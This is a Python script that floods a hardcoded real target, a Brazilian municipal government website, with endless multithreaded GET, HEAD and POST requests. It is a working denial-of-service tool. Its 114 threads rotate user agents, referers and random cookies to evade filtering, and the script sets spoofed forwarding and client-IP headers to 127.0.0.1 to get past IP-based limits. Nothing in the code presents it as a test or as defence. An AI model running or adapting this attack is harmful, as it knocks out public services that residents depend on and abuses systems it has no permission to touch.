import threading
import requests
import random
import string

def load_list_from_file(file_path):
    with open(file_path, mode='r') as file:
        lines = file.readlines()
    return [line.strip() for line in lines]

def generate_headers(user_agent, referer, cookie):
    return {
        'User-Agent': user_agent,
        'Referer': referer,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'DNT': '1',
        'Connection': 'keep-alive',
        'X-Originating-IP': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1, 127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'X-Client-IP': '127.0.0.1',
        'X-Host': '127.0.0.1',
        'X-Forwarded-Host': '127.0.0.1',
        'X-ProxyUser-Ip': '127.0.0.1',
        'Cookie': cookie,
    }

def generate_cookie():
    cookie_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    cookie_value = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
    return f"{cookie_name}={cookie_value}"

def make_request(method, url, headers, request_count):
    with requests.request(method, url, headers=headers) as response:
        if response.status_code == 200:
            print(f"Request #{request_count} sent successfully")

def worker(user_agents, referers, url, methods):
    request_count = 0
    while True:
        user_agent = random.choice(user_agents)
        referer = random.choice(referers)
        cookie = generate_cookie()
        headers = generate_headers(user_agent, referer, cookie)
        method = random.choice(methods)
        make_request(method, url, headers, request_count)
        request_count += 1

user_agents = load_list_from_file('useragents.txt')
referers = load_list_from_file('referers.txt')
url = "https://www.guaruja.sp.gov.br/"
methods = ['GET', 'HEAD', 'POST']

threads = []
for _ in range(114):  # Adjust the number of threads as necessary
    thread = threading.Thread(target=worker, args=(user_agents, referers, url, methods))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()